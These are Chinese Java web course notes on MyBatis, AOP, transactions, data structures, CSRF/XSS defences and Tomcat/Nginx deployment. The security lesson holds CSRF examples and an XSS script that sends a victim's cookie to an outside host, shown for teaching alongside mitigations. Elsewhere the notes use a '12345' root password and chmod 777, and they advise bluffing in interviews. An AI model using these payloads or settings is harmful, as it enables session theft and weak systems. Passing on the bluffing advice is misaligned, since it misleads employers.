  `at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) ~[mysql-connector-java-8.0.17.jar:8.0.17]`

    1. 报错发生在类 com.mysql.cj.jdbc.exceptions.SQLError 的  createSQLException 函数中
    2. com.mysql.cj.jdbc.exceptions.SQLError, 就是完整的类名, 包含了包的名字
    3. SQLError.java:129 代表在 SQLError.java 文件的129 行出错了
    4. 报错所处的库信息 mysql-connector-java-8.0.17.jar, 表示报错发生在第三方库 mysql-connector-java-8.0.17.jar 中, 8.0.17, 代表这个库的版本号
    5. 如果报错没有发生在第三方库中, 而是发生在 java 的标准库里面, 那么第三方库和版本号就是 [na:na] 形如`at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na]`


# 其他
  * JDBC 规定java代码如何连接数据库及规定的具体实现
  * 留意MySQL是否启动
  * 从数据库返回的数据集ResultSet中遍历
  ```
  while (rs.next()) {
    ...
  }
  ```

-------------------------------------第19课笔记----------------------------------
# Mybatis
#### 比较
  * **原JDBC方式**
    1. 写 sql 语句, 拼参数
    2. 建立数据库连接
    3. 发送 sql 语句
    4. 拿到结果 ResultSet, 新建对应的 JavaModel
    5. ResultSet 中取数据, 放入 JavaModel 的对应字段
  * **Mybatis**
    1. 写 sql 语句
    2. 返回对应的 JavaModel

#### 配置
  * 在build.gradle中引入mybatis
  * Ssmapplication.java
    * `@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)`修改为`SpringBootApplication` 实现从原先的Utility中配置数据库改为从application.properties中配置数据库

#### Mapper
  * **List<TodoModel> selectAllTodo();**
    1. 对应xml语句
    ```
    <select id="selectAllTodo" resultType="kybmig.ssm.model.TodoModel">
        SELECT * FROM ssm.todo
    </select>
    ```
    2. resultType: 表示数据库返回的数据类型
    3. 直接传入一个基本类型 int，这个 int 会被绑定到 ${id}
    4. 字符串拼接用$(不安全)
  * **void insertTodo(TodoModel todo);**
    1. 对应xml语句
    ```
    <insert id="insertTodo" useGeneratedKeys="true" keyProperty="id">
        INSERT INTO ssm.todo (content) VALUES (#{content})
    </insert>
    ```
    2. useGeneratedKeys和keyProperty: 表示Mybatis执行完插入语句后, 自动将自增长值赋值给xxx.id, 可通过xxx.getId()获取
    3. 传入一个对象, content 代表这个对象的 content 属性，注意这个对象要有 getter setter
    4. 预编译语句用#(更安全)
  * **动态代理** (只需编写TodoMapper接口, 由MyBatis结合映射文件自动实现)

    * **第一层 实例化TodoController类**[见TodoController.java]
      ```
      @Controller
      public class TodoController {
          private TodoService todoService;
          public TodoController(TodoService todoService) {
              this.todoService = todoService;
          }

          @PostMapping("/todo/add")
          public ModelAndView add(String content) {
              // 实例化之后就能调用todoService.add(...)
              TodoModel todo = todoService.add(content);
              ModelAndView mv = new ModelAndView("redirect:/todo");
              return mv;
          }
      }
      ```
      1. Mybatis扫描TodoController类
      2. 找到之前扫过的TodoService类
      3. 实例化TodoService类[见第二层] 生成todoService
      4. 将todoService传入TodoController的构造器/构造函数

    * **第二层 实例化TodoService类**[见TodoService.java]
      ```
      @Service
      public class TodoService {
          private TodoMapper todoMapper;
          public TodoService(TodoMapper todoMapper) {
              this.todoMapper = todoMapper;
          }

          public TodoModel add(String content) {
              TodoModel model = new TodoModel();
              model.setContent(content);
              // 实现接口后就能调用todoMapper.insertTodo(...)
              this.todoMapper.insertTodo(model);
              return model;
          }
          ...
      }
      ```
      1. Mybatis扫描TodoService类
      2. 找到之前扫过的TodoMapper接口
      3. 实现TodoMapper接口的方法[见第三层] 生成todoMapper
      4. 将todoMapper传入TodoService的构造器/构造函数

    * **第三层 实现TodoMapper接口**
      * 接口的所有方法的实现类似JDBC方式

    * **DynamicProxyDemo.java**
      1. 编写**TodoMapper**接口, 有两个方法select(...)和query(...)
      2. 编写代理类**MapperProxy**, 实现InvocationHandler接口并覆写invoke(...) invoke方法体内包含select(...)和query(...)的具体实现
      3. 编写**main()**
        * 通过(TodoMapper)Proxy.newProxyInstance(...)生成TodoMapper的代理对象
        * newProxyInstance(...)需要传入的参数:
          1. TodoMapper.class.getClassLoader() 类加载器, 将生成的代理类载入JVM
          2. new Class[]{TodoMapper.class} 待实现的接口, 使代理类具备接口中的所有方法
          3. new MapperProxy() 调用处理器, 调用实现了InvocationHandler类的一个回调方法

#### Topic mybatis 版本
  * **流程**
    1. TopicModel 包含属性[id, content, title, userId]且都需实现getter和setter
    2. Topic 表
        1. workbench 建表
        2. 创表语句保存到schema.sql
    3. TopicMapper
    4. TopicMapper.xml
    5. TopicService
    6. TopicController
    7. 实现相关页面

#### 登录注册
  * **流程**
    1. UserModel和UserRole
    2. User 表
        1. workbench 建表
        2. 创表语句保存到schema.sql
    3. UserMapper
    4. UserMapper.xml
    5. UserService
    6. UserController
    7. 实现相关页面
  * **交互**
    * **访问"/"**
      1. 调用index(...)
      2. 调用userService.currentUser(...)
        1. 从request中获取session 从session中获取字段"user_id"的值id
        2. id为空 调用guest(...) 返回一个游客用户
        3. id不为空 调用userMapper.selectUser(...)根据id返回目标用户或游客用户
      3. 获取模板并做替换
    * **访问"/user/add"** [在register.ftl页面提交表单]
      1. 调用register(...)
      2. 调用userService.add(...)
        1. 新建用户model 传入账号、密码和用户身份
        2. 调用userMapper.insertUser(...)在数据库中增加该用户
      3. add(...)返回该model
    * **访问"/user/login"** [在login.ftl页面提交表单]
      1. 调用login(...)
      2. 用户验证
        1. 调用userService.validLogin(...)
        2. 调用userMapper.selectOneByUsername根据用户名从数据库中查找该用户
        3. 仅当该用户存在且密码正确时返回true
      3. 验证通过
        1. 调用userService.findByUsername根据用户名获取当前用户current
        2. 从request中获取session
        3. 给session新增字段"user_id" 值为current的id
        4. 重定向到"/"
      4. 验证不通过
        1. 重定向到"/login"

# 其他
  * idea安装MyBatisCodeHelperPro

-------------------------------------第20课笔记----------------------------------
# AOP (Aspect Oriented Programming) 面向切面编程
  * 在build.gradle引入aop库
  * AOP实现登录验证和topic的edit权限[main/java/kybmig.ssm/aspect/PermissionAspect.java]
  * 5种注解
    * **@Before**: 前置通知 在方法执行之前执行
    * **@After**: 后置通知 在方法执行之后执行
    * **@AfterRunning**: 返回通知 在方法返回结果之后执行
    * **@AfterThrowing**: 异常通知 在方法抛出异常之后
    * **@Around**: 环绕通知 围绕着方法执行

#### @Before示例
```
@Before("execution(* kybmig.ssm.controller.TodoController.*(..))")
public void matchSingle() {
    Utility.log("最简单的单方法匹配 %s", request.getRequestURI());
}
```
  * `* xxx.xxx.xxx.xxx.*(..)` 对返回值、函数名和参数无限制匹配 即匹配TodoController内的所有路由函数
  * 简写 `@Before("within(kybmig.ssm.controller.TodoController)")`

#### @Around示例
```
@Around("execution(* kybmig.ssm.controller.TodoController.edit(..))")
public ModelAndView matchSingle(ProceedingJoinPoint joint) throws Throwable {
    Utility.log("路由函数之前执行 %s", request.getRequestURI());

    // 执行路由函数
    ModelAndView result = (ModelAndView) joint.proceed();

    Utility.log("路由函数之后执行 %s", request.getRequestURI());
    return result;
}
```
  * 匹配TodoController的edit(..)
  * 返回值类型必须与匹配的路由函数的返回值类型一致 即ModelAndView

# FileUploadController
#### 上传图片
  * 访问"/upload/index"
  * 调用uploadView() 载入upload.ftl
  * 提交表单到"/upload"
  * 调用singleFileUpload  

#### 访问图片
  * 访问"/avatar/{imageName}"
  * 调用avator(..)

# 事务
```
start transaction
SELECT * FROM ssm.Topic

Insert into ssm.topic
(userId, title, content)
values(1, 'train1', 'content')

commit
```

#### 并发事务带来的问题
  * 原始数据为[t0 c0]
  1. **脏读**

  当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据
    1. 用户1修改标题            [t1 c0]
    2. 用户2读新标题旧内容       [t1 c0]
    3. 用户1修改内容            [t1 c1]
  2. **丢失修改**(脏写)

  指在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为丢失修改。
    1. 用户1修改标题 [t1 c0]
    2. 用户2修改标题 [t2 c0]
    3. 用户2修改内容 [t2 c2]
    4. 用户1修改内容 [t2 c1]
  3. **不可重复读**

  在一个事务内两次读到的数据是不一样的情况
    1. 用户2读数据   [t0 c0]
    2. 用户1改数据   [t1 c1]
    3. 用户2读数据   [t1 c1]
  4. **幻读**

  它发生在一个事务读取了几行数据，接着另一个并发事务插入或删除了一些数据, 在随后的查询中，第一个事务就会发现多了或少了一些数据。
    1. 用户1读数据   [1 t0 c0]
    2. 用户2插数据   [1 t0 c0] [2 t0 c0]
    3. 用户1读数据   [1 t0 c0] [2 t0 c0]
  * **不可重复读和幻读的区别**

   不可重复读重点在读数据时数据被修改 幻读重点在于读数据时数据被插入或删除

#### 事务隔离级别
  ![](assets/markdown-img-paste-20200824093256189.png)
   * **读取未提交**：最低的隔离级别, 允许读取尚未提交的数据变更, 可能会导致脏读、幻读或不可重复读.
   * **读取已提交**：允许读取并发事务已经提交的数据, 可以阻止脏读, 但是幻读或不可重复读仍有可能发生.
   * **可重复读**：对同一字段的多次读取结果都是一致的, 除非数据是被本身事务自己所修改, 可以阻止脏读和不可重复读, 但幻读仍有可能发生.
   * **可串行化**：最高的隔离级别, 完全服从ACID的隔离级别. 所有的事务依次逐个执行, 这样事务之间就完全不可能产生干扰, 也就是说, 该级别可以防止脏读、不可重复读以及幻读.
   * MySQL默认级别为可重复读, 通过加锁读达到可串行化.

# 联表查询
```
SELECT * FROM TopicComment
inner join Topic
on Topic.id = TopicComment.topicId
where Topic.id = 1
```
```
// 当on条件不满足时 仍旧取出左边表格的数据 数据不存在用NULL填充
SELECT * FROM Topic
left join TopicComment
on Topic.id = TopicComment.topicId
where Topic.id = 3
```

# 外键
![](assets/markdown-img-paste-20200824101413484.png)
  * 在workbench中 选中TopicComment表
  *  右键->Alter Table->Foreign Keys
  * 外键命名为TopicComment_fk_Topic_id Referenced Table选择Topic表
  * Column选择topicId, Referenced Column选择id(这里id注意必须是Topic表的主键)
  * On Update选择cascade(级联更新), On Delete选择cascade(级联删除)

# 其他
  * 链式调用
  * 事务参考链接 https://github.com/Snailclimb/JavaGuide/blob/master/docs/database/%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB(%E5%9B%BE%E6%96%87%E8%AF%A6%E8%A7%A3).md

-------------------------------------第21课笔记----------------------------------
# 进程和线程的区别
#### 比喻
线程在进程下行进（单纯的车厢无法运行）
一个进程可以包含多个线程（一辆火车可以有多节车厢）
不同进程间数据很难共享（A火车换到B火车很不易，比如站点换乘）
同一进程下不同线程间数据很易共享（A车厢换到B车厢很容易）
进程要比线程消耗更多的计算机资源（一列火车比一节车厢更耗资源）
进程间不会相互影响，一个线程挂掉将导致整个进程挂掉（一列火车不影响另外一列火车，但一节车厢爆炸将影响所有车厢）
进程可以拓展到多机，线程最多适合多核（不同火车可以开在多个轨道上，同一火车的不同车厢不行）
线程所使用的资源来自其所属进程的资源(造火车时能设计火车空间 火车造好之后车厢所使用的空间受限于火车空间)
线程使用的内存地址可以上锁，即一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存。（比如火车上的洗手间）－"互斥锁"
线程使用的内存地址可以限定使用量（比如火车上的餐厅，最多只允许多少人进入，如果满了需要在门口等，等有人出来了才能进去）－“信号量”

#### 书面
（1）进程
进程是程序的一次执行过程，是一个动态概念，是程序在执行过程中分配和管理资源的基本单位，每一个进程都有一个自己的地址空间，至少有 5 种基本状态，它们是：初始态，执行态，等待状态，就绪状态，终止状态。（2）线程
线程是CPU调度和分派的基本单位，它可与同属一个进程的其他的线程共享进程所拥有的全部资源。
（3）联系
线程是进程的一部分，一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。
（4）区别：
根本区别：进程是操作系统资源分配的基本单位，而线程是任务调度和执行的基本单位
开销方面：每个进程都有独立的代码和数据空间（程序上下文），程序之间的切换会有较大的开销；线程可以看做轻量级的进程，同一类线程共享代码和数据空间，每个线程都有自己独立的运行栈和程序计数器（PC），线程之间切换的开销小。
所处环境：在操作系统中能同时运行多个进程（程序）；而在同一个进程（程序）中有多个线程同时执行（通过CPU调度，在每个时间片中只有一个线程执行）
内存分配方面：系统在运行的时候会为每个进程分配不同的内存空间；而对线程而言，除了CPU外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源。
包含关系：没有线程的进程可以看做是单线程的，如果一个进程内有多个线程，则执行过程不是一条线的，而是多条线（线程）共同完成的；线程是进程的一部分，所以线程也被称为轻权进程或者轻量级进程。

# 栈和堆
  1. 栈用来存放存活时间短的数据, 如局部变量、函数参数、返回数据、返回地址等.
编译器通过栈实现函数调用, 调用函数时, 栈增长, 函数返回时, 栈收缩.
  2. 堆用来存放存活时间长的数据, 存放的具体内容由程序员安排, 这些数据在函数调用结束后还会使用,
  3. 多个线程共享进程的堆和元空间资源，但是每个线程有自己的程序计数器、虚拟机栈和本地方法栈。

-------------------------------------第22课笔记----------------------------------
# 备忘录
(1) 写出简历(初版先上传到群文件) 2020.9.4前
(2) 完成22课个人论坛  结课前
(3) 复习作业(特别是简答)+面试大全基础部分即可开始面试 2020.9.4前
(4) 边面试 边完成《面试大全》其他部分
(5)《SQL必知必会》要看，特别是 join 和事务。
(6) 不懂就问

# 简历怎么写
#### 格式
    - 格式使用PDF 标题"职位-姓名-手机号" (发群里用"昵称_版本")
    - 姓名 手机(尽量微信沟通) 邮箱(outlook)
    - 不放照片

1. 教育经历
xx大学 软件工程系 本科
教育起止时间,工作起止时间和工作经验问老师怎么写
2. 个人项目(没有相关工作经验 所以个人项目放前面)
  - gua：删除所有 gua 相关部分。
  - readme：代码仓库要有 readme 说明项目功能。没人想看代码。
  - 动图：代码仓库 readme 要有动图，动图要有功能展示和log，具体看板书动图。没人想看代码。
  - 链接(可选)：部署链接和代码仓库链接，代码仓库 readme 要有部署链接。
  - 游客：简历、代码仓库 readme 和网站上要有测试账号。或者你做游客系统。
  - 皮肤：项目最好换一个好看的皮。第一印象很重要。https://www.rieruuuu.xyz/
  - 面试(可选)：面试的时候带笔记本现场展示。
3. 个人简介
不要说自学 可以说说大学做了什么事情(毕设)
4. 工作技能(堆砌关键词)
听过概念 掌握
听过概念而且会用 写熟练掌握
懂的多一点 写深入理解
回顾上课学到的知识点往上写
  1. Java
  2. Web后端和服务器开发  

# 简历怎么投 面试怎么面

# 工作后规划

# 其他
* 不要直接回答没有工作经历 而是回答我做过XXX项目 实现XXX功能 这些功能是工作中常见的需求 如果工作中有类似的需求 我立马可以上手去做
* 被问到不熟悉的关键词 只要听过就回答会 大不了学一下之后 下次面试这个词就会了 程序员的核心能力就是快速学习
* 对方问到xxx其实对方也大概率不是很懂xxx
* 工作后会发现大部分同事代码写的不如你 水平也不如你 只是一直在原地踏步而已 有可能同事做错事情还得给他擦屁股
* 大家其实都不懂 但如果他人敢吹自己不敢吹就会简历都过不了
* 自信 给对方可靠的感觉 有自信对方才会高看你 哪怕他觉得哪些知识点可能有不足 有自信对方才相信你可以做到这些事情
* 在找工作阶段做的准备越足 越容易找不好工作
* 找工作像写程序 先写一个最简单的demo再修修改改
* 先入行 入行之后一切好说 下一份工作也很容易加薪 建议呆满一年后跳槽
* 半个月到一个月找到工作 二个月都久了
* 面的越多 表现的越多 回顾总结的越多 面试水平才会提高
* 前5个面试是成长最快的 每次面试时用手机录音 回去后对着录音整理面经 然后按格式分享到面经版块 与老师沟通总结
* 每年用假名假手机号花一星期面试 看看自己在市场上什么价

-------------------------------------第23课笔记----------------------------------
* 时间复杂度
* 数组 链表 栈 队列 字典 树 图

4 3 1 7
1 3 4 7

时间复杂度
空间复杂度

对于耗费资源的计算

A 方案: 1s, 100 MB
B 方案: 2s, 10 MB

函数 A, 调用一次 10s, 调用 N, 10 * N
函数 B, 调用一次 1s, 调用 N 次耗时 1 * N * N

A 跑 10次, 100s
B 跑 100次, 10000s

1. 抛开平台和具体实现的影响
2. 要考虑到调用次数的增多, 对于总耗时的影响

看, 随着调用次数的增长, 算法总的操作数量的一个估算
叫 大 O 阶, 用个数学符号来代替, O(N)
N 代表输入的规模


public static void A(int n) {
    for (int i = 0; i < n; i++) {
        Utils.log("this is A"); // 单条语句耗费时间x
        Utils.log("this is A"); // 单条语句耗费时间x
        Utils.log("this is A"); // 单条语句耗费时间x
        Utils.log("this is A"); // 单条语句耗费时间x
    }
    // 耗费时间 4 * x * n
}



 public static void B(int n) {
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < n; j++) {
            Utils.log("this is B"); // 单条语句耗费时间x
        }
    }
    Utils.log("this is B"); // 单条语句耗费时间x
    // 耗费时间 x * n * n + x
}

n < 2, 4x, x
n =  2, 8x, 4x
n = 3, 12x, 9x
n = 4, 16x, 16x
n = 5, 20x, 25x


O(N) = 4n, 记作 O(4n)
O(N)  = n ^ 2, 记做 O(n ^ 2)

400
10000


函数A总时间 = 4 * x * N
           = 4xN

O(4xN) -> O(N)

函数B总时间 = x * n * n + x
           = x * n ^ 2 + x

O(x * n ^ 2 + x) =  O(n ^ 2 + 1) =  O(n ^ 2)



算法的时间复杂度
--------------

- 大 O 记法，是描述算法复杂度的符号
- 时间复杂度说的是算法的运行时间随着数据规模的增长而增长的幅度
- 空间复杂度就是占用内存的多少
A方案: 1s, 100 MB 内存
B方案: 2s, 10 MB 内存

- O(1)
    - 常数复杂度，代表时间复杂度最低的算法。
    - 取数组前一万个元素的和
    - 字典和集合的存取都是 O(1)
    - 用下标进行数组的存取是 O(1)
        address + size(element) * 100
        - `a[1]` `a[2]`
- O(logN)  实际上是(log 2 N)
    - 对数复杂度
    - `[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]`
      2 的 n 次方 >= 10
      n = 4;
      最慢的情况下就要查找 log10 次,  log10 * x
      如果数据规模是 n, 平均每次查找用 x, 总时间是 logN * x, 时间复杂度就是 logN
    - 假设有一个有序数组，以二分法查找
    - 1000 500 250 .... 0
    - 2^n = 1000 -> n = log1000 -> n = 10
- O(N)
    - 线性复杂度
    - `[3, 4, 7, 1, 2, 6, 5, 9, 10, 8]`
    - x * n -> O(x * n) -> O(n)
    - 取数组所有元素的和
    - 假设有一个无序数组，以遍历的方式在其中查找元素

- O(MlogN) O(NlogN)
    - 求两个数组交集，其中 A 为无序数组， B 为有序数组
    假设遍历每步用时 x, 比较每步用时是 y,
    A 里面有 M 个元素, B 里面有 N 个元素
    一个元素在 B 里面查找, 耗时是  logN * y
    A 里面所有元素在 B 里面都找一遍, M * logN * y * x
    MlogN * xy
    时间复杂度就是 M*logN

    - `[3, 4, 7, 1, 2, 6, 5, 9, 10]` `[1, 3, 11]`
    - A 有 M 个元素，B 有 N 个元素
    - A 数组每一个元素都要在 B 数组中进行查找操作
    - 每次查找如果使用二分法则复杂度是 O(logN)
    - 查找 M 次 即是 O(M)
    - 总的就是 O(M) * O(logN) = O(MlogN)
- O(N^2) O(M*N)
    - 平方复杂度
    - 求两个长度一样的无序数组的交集
    - 求长度为 M 和长度为 N 的两个无序数组的交集
    - `[3, 4, 7, 1, 2, 6, 5, 9, 10, 8]` `[3, 1, 13]`
    - M * N, N ^ 2




四大数据结构
------------

针对常用的操作，我们总结了一套常用的数据结构


1. 数组  array
    - 连续的一块存储空间
    - 读取元素时间是 O(1)
    - 插入末尾是 O(1)
    - 插入、删除是 O(n),
       因为数组要求是连续的空间, 不能有空格,
       所以插入和删除都要移动修改插入或者删除位置之后的元素
       123456789
       12345 789
       123457 89
       1234578 9
       12345789

       删除 k 位置的数据, 如果有 n 个元素
       移动 n - k 个数据
       移动一个元素, 耗费时间 y
       (n - k) * y -> n - k -> O(n)
    -
2. 链表 linked list
    - 手拉手的盒子，一个盒子只能访问左右手的盒子
    - 以下标方式读取元素的时间是 O(n)
    - 插入、删除是 O(1)
    - 栈和队列是链表的改良型

栈和队列
栈是先进后出, 相当于往水桶里面放东西, 先放进去的最后才能取出来
队列是先进先出, 相当于排队


3. 字典
m.put("age", 333)
m.pug("name", 4444)


    - 把字符串转为数字作为下标存储到数组中
    - 字符串转化为数字的算法是 O(1)
    - 所以字典的存取操作都是 O(1)
    - 除非对数据有顺序要求，否则字典永远是最佳选择
    - 字符串转化为数字的算法 hash 哈希
        1. 确定数据规模，这样可以确定容器数组的大小 size
        2. 把字符当作 10 进制数字得到结果
            - 'gua' 被视为 g * 1 + u * 10 + a * 100 得到结果 n
            - n % size 作为字符串在数组中的下标
            - 通常 size 会选一个 素数
            rehash
4. 二叉搜索树（我们只用，不写，甚至只是隐含在用，你并不知道你用的是树）
    - 搜索, 删除, 查找的复杂度, 都是 O(log(n)), n 是节点数量
    - AVL 树，名字三个作者的缩写
    - 红黑树，非常难，世界上没几个人会

二叉树: 子节点最多只有两个子树(节点)
二叉搜索树: 如果有左树, 那么左树上所有节点的值, 都小于根节点的值; 右树反之, 所有节点的值, 都大于根节点的值
搜索, 删除, 查找的复杂度, 都是 O(log(n)), n 是节点数

平衡: 左右树的高度, 相差不超过 1, 就是平衡的
平衡二叉搜索树, 插入和删除的时候, 都要保持树的平衡, 这个平衡的操作, 就是树的旋转
AVL 树
红黑树

5. 图
    - 额外的，图是一种有时候有用但你一辈子都可能写不到的数据结构
    - 只了解，不用学习如何实现
    - 图的应用举例
        - 地图导航
        - 全国几个大城市之间的出行方案(有价格/时间/路途等权重)

-------------------------------------第24课笔记----------------------------------
# CSRF/XSRF 跨站请求伪造 (cross-site request forgery)
#### 示例一
```
<img src="http://localhost:9000/topic/delete?id=14" hidden>
```

#### 示例二
```
<form id="form" method="POST" action="http://localhost:9000/topic/add">
    <input name='title' value="csrf" style="display: none" >
    <input name='content' value="csrfContent" style="display: none" >
    <input id="add" type="submit" value="点击领取金币" class="gua-button">
</form>
```

#### 解决方式 (token拆分/验证码)
  * 在自己网站的页面上放一串字符串, 这串字符串和用户的 cookie 加起来, 才能执行操作, 本质就是把 token 拆成两部分, 其中一部分只有访问我们的网站才能拿到

  ```
  @GetMapping("/topic")
    public ModelAndView index(HttpServletRequest request) {
        List<TopicModel> topics = topicService.all();
        String token = UUID.randomUUID().toString();
        UserModel user = userService.currentUser(request);
        tokenMap.put(user.getId().toString(), token);
        ModelAndView m = new ModelAndView("topic/index");
        m.addObject("topics", topics);
        m.addObject("token", token);
        return m;
    }
  ```
  * 访问"/topic" 调用index(..) 以用户ID为key 生成的token为value 存入tokenMap (每次访问都会更新token) 然后把token放入topic/index页面的`<a href="/topic/delete?id=${t.id}&token=${token}">删除</a>`处

  ```
  @GetMapping("/topic/delete")
    public ModelAndView delete(int id, String token, HttpServletRequest request) {
        Integer uid = (Integer) request.getSession().getAttribute("user_id");
        String userToken = tokenMap.get(uid.toString());

        if (userToken.equals(token)) {
            topicService.deleteById(id);
            return new ModelAndView("redirect:/topic");
        } else {
            return new ModelAndView("redirect:/login");
        }
    }
  ```
  * 在topic/index页面点击删除 访问"/topic/delete" 调用delete(..) 根据request的user_id从tokenMap中找到存储的token1 与传入的token2比对 一致则说明该请求来自于我们的网站 继而完成删帖操作



# XSS 跨站脚本攻击 (cross-site scripting)
#### 示例一
```
<script>alert("你被攻击了")</script>
```
  * 访问"/todo" 在"请输入todo"处 输入上述脚本
  * 此脚本将被当成一个todo的content加载到页面 此后每次访问"/todo"时此脚本都会被执行

#### 示例二
```
<script>
c = document.cookie;
alert(c);
document.body.insertAdjacentHTML("beforeEnd",` <img src='http://www.kuaibiancheng.com/uploads/avatar/default.gif?cookie=${c}'>`)
</script>
```
  * 该脚本从document获取cookie并弹到页面上显示 然后往页面内插入一个img标签 src为访问某网站并附带获取的cookie 让对方网站误以为是该用户在访问


#### 解决方式 (HTTPOnly/HTML转义)
  * HTTPOnly 设置cookie禁止被JS脚本获取
  * HTML转义 比如从页面输入的<script>将被转义成&ltscript&gt 避免被浏览器解析成HTML 模板引擎freemaker会提供类似功能
  ```
  @PostMapping("/todo/add")
    public ModelAndView add(String content) {
        content = content.replace(">", "&gt");
        content = content.replace("<", "&lt");
        TodoModel todo = todoService.add(content);
        ModelAndView mv = new ModelAndView("redirect:/todo");
        return mv;
    }
  ```

# resultMap结果映射
  * TopicModel
  ```
  //增加属性commentList 同时配置getter和setter
  private ArrayList<TopicCommentModel> commentList;
  ```
  * TopicController
  ```
  @GetMapping("/topic/detail/{id}")
    public ModelAndView detail(@PathVariable Integer id) {
        TopicModel topicModel = topicService.findByIdWithCommentsAndUser(id);
        ModelAndView mv = new ModelAndView("topic/detail");
        mv.addObject("topic", topicModel);
        return mv;
    }
  ```
  * TopicService
  ```
  public TopicModel findByIdWithCommentsAndUser(Integer id) {
      return this.topicMapper.selectOneWithCommentsAndUser(id);
  }
  ```
  * TopicMapper
  ```
  TopicModel selectOneWithCommentsAndUser(Integer id);
  ```
  * TopicMapper.xml
  ```
  <resultMap id="selectOneWithCommentsAndUserMap" type="kybmig.ssm.model.TopicModel">
      <id property="id" column="id"/>
      <result property="title" column="title" />
      <result property="content" column="content" />
      <collection property="commentList" ofType="kybmig.ssm.model.TopicCommentModel">
          <id property="id" column="c_id" />
          <result property="content"  column="c_content" />
          <association property="user" javaType="kybmig.ssm.model.UserModel">
              <result property="username" column="u_username" />
          </association>
      </collection>
  </resultMap>

  <select id="selectOneWithCommentsAndUser" resultMap="selectOneWithCommentsAndUserMap">

      SELECT
          Topic.id,
          Topic.title,
          Topic.content,
          TopicComment.id as c_id,
          TopicComment.content as c_content,
          User.username as u_username
      FROM
          ssm.Topic left join (TopicComment join User)
          on Topic.id = TopicComment.topicId and TopicComment.userId = User.id
      where Topic.id = #{id}
  </select>
  ```
* detail.ftl
```
<h1>${topic.title}</h1>
<p>${topic.content}</p>

<#list topic.commentList as c >
    ${c.id}: ${c.content} | ${c.user.username}
    <br>
</#list>
```

# 邮件功能
  * build.gradle注入相关依赖(spring-boot-starter-mail)
  * application.properties写入邮箱配置
  * 登录QQ邮箱 开启IMAP/SMTP服务
  * 实现MailController 包括同步和异步发送邮件
  * 开启异步
    1. SsmApplication中加入注解@EnableAsync
    2. MailController内的sendMailAsync加入注解@Async

# 其他
  * @RequestMapping("/mail") 提取路由公共前缀

-------------------------------------第25课笔记----------------------------------
# 流程
  * 浏览器发送请求->Tomcat->Servlet->Spring MVC
  * 升级版 浏览器发送请求 -> http 服务器(nginx, Apache) -> Tomcat -> Servlet -> Spring MVC

# Servlet
  * 实质就是一个接口 有5个方法
    1. init(..) 初始化
    2. service(..) 请求处理
    3. destroy() 销毁
    4. getServletConfig()
    5. getServletInfo()
  * 定义的是一套处理网络请求的规范 所有实现servlet的类，都需要实现这5个方法
  * 所有想要处理网络请求的类 都需要回答三个问题
    1. 你初始化时要做什么
    2. 你销毁时要做什么
    3. 你接受到请求时要做什么
  * 接口的实现由Spring MVC负责

# ServletDemo
  * build.gradle 修改配置使得可以build出war包而不是jar包
  ```
  plugins {
//    id 'java'
    id 'io.spring.dependency-management' version '1.0.7.RELEASE'
    id 'war'
    id 'idea'
}
  ```
  * build war包 存储在build/libs下
  * 配置tomcat: Edit Configuration->"+"->Tomcat Server->local
    1. Server->Configure->导入"apache-tomcat-9.0.37"文件夹
    2. Deployment->"+"->External Source->导入war包->Application context修改为/[目前只有一个war包 设置为根路径即可]
  * 修改tomcat权限 `chmod -R 777 apache-tomcat-9.0.37`

# war包结构
  * ssm-0.0.1-SNAPSHOT
    * META-INF
    * org [Spring框架对应的依赖]
    * WEB-INF
      * classes 代码
      * lib 代码中用到的库
      * lib-provided 代码中用到的库

# 服务器部署2.0
  1. `root@xx.xx.xxx.xx` root身份登录服务器
  2. `udo apt install nginx tomcat9 mysql-server openjdk-11-jdk`  安装相关软件
  3. `sudo rm -r /var/lib/tomcat9/webapps/ROOT` 删除Tomcat自带目录
  4. `sudo mysql_secure_installation` 配置数据库
      * 第一个选项选 n
      * 输入密码 12345
      * 确认密码
      * 剩下的所有选项都是选 y
  5. `mysql` 进入数据库
  6. 修改数据库密码为12345
  ```
  SELECT user,authentication_string,plugin,host FROM mysql.user;
  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345';
  FLUSH PRIVILEGES;
  ```
  7. `quit` 退出数据库
  8. Workbench 远程连接数据库
    * 打开Workbench 点击"+"
    * Connection Name: server_java
    * Connection Method: Standard TCP/IP over SSH
    * SSH Hostname: xx.xx.xxx.xx:22
    * SSH Username: root
    * SSH Key File: /xx/xx/.ssh/
    * 点击`Store in Keychain` 输入12345
    * 点击`Test Connection`
  9. 初始化数据库 复制 schema.sql 的内容到 Workbench
  10. 项目打包并上传到服务器运行
    * 在本地编译出 .war 包 选择 ssm[build] 并运行就会自动生成 .war 包
    * 生成的 .war 包路径为项目下的 build/libs/ssm-0.0.1-SNAPSHOT.war
    * 用 scp 或者 filezilla 把生成的 .war 包拷贝到服务器上去
    * scp 方式 `cd 项目目录` 然后`scp build/libs/ssm-0.0.1-SNAPSHOT.war root@xx.xx.xxx.xx:/var/lib/tomcat9/webapps/ROOT.war`
    * `ufw allow 8080` 防火墙打开 8080 端口
    * 测试能否通过 IP 正常访问 http://xx.xx.xxx.xx:8080
  11. Nginx配置
    * [服务器端] 删除默认配置 `sudo rm /etc/nginx/sites-enabled/default`
    * [本地] 自定义 Nginx 配置(见ssm.nginx)
    ```
    server {
        listen 80;

        location / {
            proxy_pass http://localhost:8080;
        }
    }
    // Nginx 监听80端口 对于'/'路径的请求 转到8080端口
    ```
    * [本地] 上传配置到服务器
    ```
    cd 项目目录
    scp ssm.nginx root@xx.xx.xxx.xx:/tmp/ssm.nginx
    ```
    * [服务器端] 写入配置
    ```
    sudo cp /tmp/ssm.nginx /etc/nginx/sites-enabled/ssm.nginx
    ```
